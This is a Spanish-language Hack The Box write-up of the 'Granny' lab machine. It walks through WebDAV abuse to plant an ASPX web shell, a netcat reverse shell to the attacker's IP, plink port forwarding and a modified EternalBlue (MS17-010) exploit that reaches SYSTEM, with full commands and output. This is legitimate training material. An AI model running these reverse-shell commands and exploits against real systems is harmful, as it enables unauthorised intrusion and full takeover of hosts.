---
title: Hack The Box Granny
author: k4miyo
date: 2021-09-20
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Patch Management]
---

## Granny
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.15.

```bash
❯ ping -c 1 10.10.10.15
PING 10.10.10.15 (10.10.10.15) 56(84) bytes of data.
64 bytes from 10.10.10.15: icmp_seq=1 ttl=127 time=140 ms

--- 10.10.10.15 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 140.069/140.069/140.069/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 16:34 CDT
Initiating SYN Stealth Scan at 16:34
Scanning 10.10.10.15 [65535 ports]
Discovered open port 80/tcp on 10.10.10.15
Completed SYN Stealth Scan at 16:34, 27.09s elapsed (65535 total ports)
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.31s latency).
Scanned at 2021-09-20 16:34:23 CDT for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 30 (1.320KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh`, se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.15
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80 10.10.10.15 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 16:36 CDT
Nmap scan report for 10.10.10.15
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Mon, 20 Sep 2021 21:41:29 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```

Obsevamos el puerto 80/TCP abierto y se encuentra corriendo la tecnología _Microsoft IIS httpd 6.0_ la cual es vulnerable a buffer overflow en la función *ScStoragePathFromUrl* en el servicio *WebDAV* asociado al CVE CVE-2017-7269. Podríamos tratar de utilizar el exploit público, pero esta vez vamos por los métodos HTTP y la herramienta `cadaver`. Antes de todo, vamos a probar cuales son las extensiones válidas que acepta el servidor:

```bash
❯ davtest -url http://10.10.10.15                         
********************************************************
 Testing DAV connection                                         
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: tMk2tUFP                                                                                 
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_tMk2tUFP
********************************************************
 Sending test files                                                                                                              
PUT     cgi     FAIL                                                                                                             
PUT     aspx    FAIL                                                                                                             
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.jsp
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.jhtml
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.php
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.cfm
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.html
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.pl 
PUT     shtml   FAIL                                            
PUT     asp     FAIL                                            
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.txt
********************************************************
 Checking for test file execution
EXEC    jsp     FAIL
EXEC    jhtml   FAIL                                                                                                             
EXEC    php     FAIL
EXEC    cfm     FAIL                                                                                                             
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.html
EXEC    pl      FAIL                                            
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.txt
                                                                
********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_tMk2tUFP
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.jsp
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.jhtml
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.php
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.cfm
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.html
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.pl
PUT File: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.txt
Executes: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.html
Executes: http://10.10.10.15/DavTestDir_tMk2tUFP/davtest_tMk2tUFP.txt
```

Vemos en los resultados que NO podemos subir archivos de extensión *asp* y *aspx*, los cuales son relacionados a Microsoft IIS. Podríamos pensar que como nos permite subir archivos PHP, podríamos ir por ahí, pero NO, por que el código no se nos va a interpretar. 

Pensando un poco, podríamos subir un archivo con una extensión válida y luego a través de método HTTP MOVE podriamos renombrar el archivo con la extensión correcta. Así que vamos a buscar un archivo `cmd.aspx` y lo copiamos a nuestro directorio de trabajo.

```bash
❯ locate cmd.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
❯ cp $(!!) .
cp $(locate cmd.aspx) .
❯
```

Lo renombramos con extensión *txt* y con la herramienta `cadaver` subimos el archivo al servidor y con el método MOVE le cambiamos la extensión a `aspx`:

```bash
❯ cadaver 10.10.10.15
dav:/> ls
Listando colección `/': exitoso.
 Col:   DavTestDir_tMk2tUFP                    0  sep 20 16:48
 Col:   _private                               0  abr 12  2017
 Col:   _vti_bin                               0  abr 12  2017
 Col:   _vti_cnf                               0  abr 12  2017
 Col:   _vti_log                               0  abr 12  2017
 Col:   _vti_pvt                               0  abr 12  2017
 Col:   _vti_script                            0  abr 12  2017
 Col:   _vti_txt                               0  abr 12  2017
 Col:   aspnet_client                          0  abr 12  2017
 Col:   images                                 0  abr 12  2017
        _vti_inf.html                       1754  abr 12  2017
        iisstart.htm                        1433  feb 21  2003
        pagerror.gif                        2806  feb 21  2003
        postinfo.html                       2440  abr 12  2017
dav:/> put aspx_cmd.txt
Transferiendo aspx_cmd.txt a '/aspx_cmd.txt':
 Progreso: [                              ]   0.0% of 1398 bytes Progreso: [=============================>] 100.0% of 1398 bytes exitoso.
dav:/> MOVE aspx_cmd.txt aspx_cmd.aspx
Moviendo '/aspx_cmd.txt' a '/aspx_cmd.aspx':  exitoso.
dav:/>
```

A partir de aquí, podriamos ir a la web y tratar de visualizar nuestro recurso:

![](/assets/images/htb-granny/granny_cmd.png)

Tenemos ejecución de comandos a nivel de sistema; por lo tanto, vamos a entablarnos una reverse shell. Primeramente, buscamos el archivo `nc.exe` en nuestra máquina, lo traemos a nuestro directorio de trabajo y nos compartmos un servidor por SMB.

```bash
❯ locate nc.exe
/usr/share/sqlninja/apps/nc.exe
❯ cp $(!!) .
cp $(locate nc.exe) .
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Nos ponemos en escucha por el puerto 443 y ejecutamos el siguiente comando en la web shell:

```bash
start /b \\10.10.14.16\smbFolder\nc.exe -e cmd 10.10.14.16 443
```

Y vemos que tenemos una conexión:

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.15,1030)
[*] AUTHENTICATE_MESSAGE (\,GRANNY)
[*] User GRANNY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY)
[*] User GRANNY\GRANNY$ authenticated successfully
[*] GRANNY$::HTB:043d21608523d7a700000000000000000000000000000000:b3ce0c226d649b1f7ee422cb50515b441b84027107699c3b:aaaaaaaaaaaaaaaa
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.15] 1032
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

Ya nos encontramos dentro de la máquina como el usuario `nt authority\network service`.  Ahora nos falta escalar privilegos, por lo que enumeramos un poco el sistema:

```bash
whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

c:\windows\system32\inetsrv>
```

Vemos el privilegio `SeImpersonatePrivilege` habilitado y ya debemos estar pensando en **Juicy Potato**; pero para este caso, vamos a hacerlo de otra forma. Vamos a listar los puertos que se encuentran abiertos en la máquina:

```bash
netstat -nat
netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5859           0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.15:80         10.10.14.16:50124      ESTABLISHED     InHost      
  TCP    10.10.10.15:139        0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.15:1033       10.10.14.16:445        ESTABLISHED     InHost      
  TCP    10.10.10.15:1035       10.10.14.16:443        ESTABLISHED     InHost      
  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING       InHost      
  UDP    0.0.0.0:445            *:*                    
  UDP    0.0.0.0:500            *:*                    
  UDP    0.0.0.0:1026           *:*                    
  UDP    0.0.0.0:4500           *:*                    
  UDP    10.10.10.15:123        *:*                    
  UDP    10.10.10.15:137        *:*                    
  UDP    10.10.10.15:138        *:*                    
  UDP    127.0.0.1:123          *:*                    
  UDP    127.0.0.1:1029         *:*                    

c:\windows\system32\inetsrv>
```

Vemos que tiene el puerto 445 abierto de manera interna, así que vamos a aplicar un *Remote Port Forwarding* con la herramienta [plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) descargando para la arquitectura x86. Nos compartimos un servidor SMB y transferimos el archivo:

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.15,1035)
[*] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY)
[*] User GRANNY\GRANNY$ authenticated successfully
[*] GRANNY$::HTB:ef434db551e7093b00000000000000000000000000000000:693edb5a9ff91cca86f1f6b11c6a63a5dd306ae6bd614486:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
```

```bash
copy \\10.10.14.16\smbFolder\plink.exe plink.exe
copy \\10.10.14.16\smbFolder\plink.exe plink.exe
        1 file(s) copied.

C:\WINDOWS\Temp\Privesc>

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\WINDOWS\Temp\Privesc

09/21/2021  04:10 AM    <DIR>          .
09/21/2021  04:10 AM    <DIR>          ..
09/21/2021  01:27 AM           646,384 plink.exe
               1 File(s)        646,384 bytes
               2 Dir(s)   1,338,937,344 bytes free

C:\WINDOWS\Temp\Privesc>
```

Antes de ejecutar el programa, vamos a transferir el archivo `nc.exe` a la máquina víctima:

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.15,1046)
[*] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY)
[*] User GRANNY\GRANNY$ authenticated successfully
[*] GRANNY$::HTB:aea8a26a51f500d900000000000000000000000000000000:4502c04aa604ecadea0a4a49d39d2102c825440e40371d4a:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
```

```bash
copy \\10.10.14.16\smbFolder\nc.exe nc.exe
copy \\10.10.14.16\smbFolder\nc.exe nc.exe
        1 file(s) copied.

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\WINDOWS\Temp\Privesc

09/21/2021  04:39 AM    <DIR>          .
09/21/2021  04:39 AM    <DIR>          ..
09/21/2021  01:02 AM            28,160 nc.exe
09/21/2021  01:27 AM           646,384 plink.exe
               2 File(s)        674,544 bytes
               2 Dir(s)   1,324,756,992 bytes free

C:\WINDOWS\Temp\Privesc>
```

Debemos tener en cuenta que necesitamos hacer algunos cambios en nuetra máquina de atacante; primero editamos el archivo `/etc/ssh/sshd_config` modificando los sigueintes parámetros:

- Port 2222
- PermitRootLogin yes

Cambiamos el puerto default del servicio SSH debido a que la plataforma de HackTheBox tiene unas reglas que no permite el puerto 22 para hacer *Remote Port Forwarding* y permitimos el login del usuario **root**.

Una vez hecho esto, levantamos y reiniciamos el servicio SSH; así como también validamos que no tenemos el puerto 445 listado en `netastat`:

```bash
❯ service ssh start
❯ service ssh restart
❯ netstat -nat | grep "445"
```

Por útlimo, cambiamos la contraseña del usuario **root** por una más fácil (para este caso será *hola*). Ahora si, ejecutamos el programa en la máquina víctima:

```bash
❯ passwd
Nueva contraseña: 
Vuelva a escribir la nueva contraseña: 
passwd: contraseña actualizada correctamente
```

```bash
plink.exe -l root -pw hola -R 445:127.0.0.1:445 -P 2222 10.10.14.16                                                         [4/4]
plink.exe -l root -pw hola -R 445:127.0.0.1:445 -P 2222 10.10.14.16
The server's host key is not cached. You have no guarantee
that the server is the computer you think it is.
The server's ssh-ed25519 key fingerprint is:         
ssh-ed25519 255 SHA256:NCwkGzWJ47qJZj30RdSxdkzOTenMrn4+fRsdijaL5GQ
If you trust this host, enter "y" to add the key to       
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.                                                     
y                                                               
Using username "root".                                          
-e                                                              
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___  
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___| 
                                                  
                                                                                                                                 
Distro version:                                                                                                                  
Kernel Version: Linux 5.10.0-8parrot1-amd64 x86_64
-e 
The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
                                                                
Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.                                    
                                                                
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___  
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                                                                                                 
                                                                                                                                 
                                                                

The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 20 17:46:00 2021 from 10.10.10.15
```

Ahora validamos que tenemos el puerto 445 en escucha en nuestra máquina:

```bash
❯ netstat -nat | grep "445"
tcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN     
tcp6       0      0 ::1:445                 :::*                    LISTEN
```

También podríamos validar con `crackmapexec` recordando que debemos apuntar a nuestra loopback:

```bash
❯ crackmapexec smb 127.0.0.1
SMB         127.0.0.1       445    GRANNY           [*] Windows Server 2003 R2 3790 Service Pack 2 (name:GRANNY) (domain:granny) (signing:False) (SMBv1:True)
```

Debido a la versión de sistema operativo y versión de la aplicación SMB, debemos estar pensando en el **Eternal Blue**; así que nos descargamos el exploit:

```bash
❯ git clone https://github.com/worawit/MS17-010
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 731.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
```

Nos metemos en la carpeta y corremos el archivo `checker.py` para validar si la máquina es vulnerable:

```bash
❯ python checker.py 127.0.0.1
Target OS: Windows Server 2003 R2 3790 Service Pack 2
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (32 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (32 bit)
browser: STATUS_OBJECT_NAME_NOT_FOUND
```

Vemos que tiene la leyenda ***OK (32 bit)*** para los *named pipes* **samr** y **lsarpc**; es decir, podemos ejecutar el exploit en la máquina, que para este caso, ocuparemos el `zzz_exploit.py` modificandolo un poco. Las modificaciones que haremos serán las siguientes:

- En la función `def smb_pwn(conn, arch):` comentaremos las siguientes lineas:
  - \#print('creating file c:\\pwned.txt on the target')
  - \#tid2 = smbConn.connectTree('C$') 
  - \#fid2 = smbConn.createFile(tid2, '/pwned.txt')
  - \#smbConn.closeFile(tid2, fid2)
  - \#smbConn.disconnectTree(tid2)
 - Descomentamos la siguiente linea:
   - service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 - Y la cambiamos a entablarnos una reverse shell con `nc.exe`:
   - service_exec(conn, r'cmd /c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.16 443')
 
Con esto, lo único que nos falta es ponernos en escucha por el puerto 443 y ejectuar el exploit:

```bash
❯ python zzz_exploit.py 127.0.0.1 samr
Target OS: Windows Server 2003 R2 3790 Service Pack 2
Groom packets
attempt controlling next transaction on x64
attempt controlling next transaction on x86
success controlling one transaction
Target is x86
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x85115d48
SESSION: 0xe39c0010
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe3c54878
userAndGroupCount: 0x5
userAndGroupsAddr: 0xe3c54918
overwriting token UserAndGroups
Opening SVCManager on 127.0.0.1.....
Creating service SRsC.....
Starting service SRsC.....
The NETBIOS connection with the remote host timed out.
Removing service SRsC.....
ServiceExec Error on: 127.0.0.1
Unexpected answer from server: Got 46, Expected 47
Done
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.15] 1050
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```

Ya con esto nos encontramos dentro de la máquina como el usuario `nt authority\system` y podemos visualizar las flags (user.txt y root.txt).
